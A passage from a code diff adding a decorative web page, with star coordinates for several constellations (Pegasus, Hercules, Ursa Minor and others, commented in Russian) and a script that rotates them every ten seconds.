+            {top: 45, left: 65}, {top: 50, left: 60}, {top: 55, left: 55}
+        ],
+        // 11. Пегас
+        [
+            {top: 20, left: 30}, {top: 25, left: 35}, {top: 30, left: 40},
+            {top: 25, left: 45}, {top: 20, left: 40}, {top: 25, left: 35}
+        ],
+        // 12. Геркулес
+        [
+            {top: 65, left: 45}, {top: 60, left: 50}, {top: 55, left: 55},
+            {top: 50, left: 50}, {top: 45, left: 45}, {top: 50, left: 40},
+            {top: 55, left: 35}
+        ],
+        // 13. Возничий
+        [
+            {top: 40, left: 20}, {top: 35, left: 25}, {top: 30, left: 30},
+            {top: 35, left: 35}, {top: 40, left: 30}
+        ],
+        // 14. Лисичка
+        [
+            {top: 70, left: 80}, {top: 65, left: 75}, {top: 60, left: 70},
+            {top: 65, left: 65}, {top: 70, left: 70}
+        ],
+        // 15. Малая Медведица
+        [
+            {top: 15, left: 50}, {top: 20, left: 55}, {top: 25, left: 60},
+            {top: 30, left: 65}, {top: 35, left: 63}, {top: 32, left: 58},
+            {top: 28, left: 55}
+        ]
+    ];
+
+    let currentConstellation = 0;
+
+    // Меняем созвездия каждые 10 секунд
+    window.addEventListener('load', () => {
+        createConstellationLines();
+        setInterval(changeConstellation, 10000);
+    });
+  </script>
+</body>
+</html>
